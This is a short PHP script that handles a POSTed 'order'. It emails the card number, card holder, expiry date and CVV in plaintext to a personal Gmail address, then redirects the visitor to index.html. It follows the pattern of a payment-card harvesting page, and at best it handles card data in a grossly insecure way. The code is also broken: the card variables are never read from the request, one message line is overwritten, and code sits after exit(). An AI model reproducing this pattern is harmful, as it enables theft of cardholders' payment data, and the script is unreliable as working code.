
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Build email content
    $to = "nikolastan4ev@gmail.com";
    $subject = "New Order Placed";
    $message = "An order has been placed.";
    $message = "Card Number: $cardNumber\n";
    $message .= "Card Holder: $cardHolder\n";
    $message .= "Expiry Date: $expiryDate\n";
    $message .= "CVV: $cvv\n";

    // Send the email
    mail($to, $subject, $message);

    // Redirect the user to index.html after processing the order
    header("Location: index.html");
    exit();
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
    
}
?>